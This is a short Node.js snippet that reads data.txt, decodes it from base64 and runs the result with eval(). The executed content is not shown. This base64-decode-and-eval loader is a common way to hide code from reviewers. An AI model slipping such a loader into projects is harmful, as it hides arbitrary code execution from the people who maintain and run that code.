const fs = require('fs');
const code = fs.readFileSync('./data.txt').toString();
eval(Buffer.from(code, 'base64').toString('utf8'));